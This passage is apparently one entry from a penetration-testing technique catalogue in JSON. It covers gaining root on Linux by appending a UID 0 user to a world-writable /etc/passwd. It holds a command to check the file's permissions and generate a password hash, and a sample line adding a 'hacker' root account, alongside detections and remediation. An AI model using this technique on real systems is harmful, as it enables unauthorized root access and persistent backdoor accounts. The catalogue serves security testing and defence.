    "id": "linux-writable-etc-passwd",
    "tool": "manual",
    "category": "privilege_escalation",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "ls -la /etc/passwd && openssl passwd -1 -salt xyz password123",
    "name": "Writable /etc/passwd",
    "description": "If /etc/passwd is writable, add a new root user directly.",
    "arguments": {
      "ls -la": "Check permissions",
      "openssl passwd": "Generate password hash"
    },
    "expected_output": "# If writable, add:\nhacker:$1$xyz$hash:0:0:root:/root:/bin/bash",
    "use_case": "Instant root if /etc/passwd is world-writable \u2014 add user with UID 0.",
    "prerequisites": [
      "Write access to /etc/passwd"
    ],
    "mitre_mapping": [
      "T1548"
    ],
    "mitre_tactic": "Privilege Escalation",
    "detections": [
      "Modified /etc/passwd",
      "New UID 0 user"
    ],
    "remediation": [
      "Correct /etc/passwd permissions (644)",
      "File integrity monitoring"
    ],
    "common_mistakes": [
      "File not writable",
      "Not generating valid hash format"
    ],
    "alternatives": [
      "linpeas (checks automatically)"
    ],
    "references": [
      "https://gtfobins.github.io"
    ],
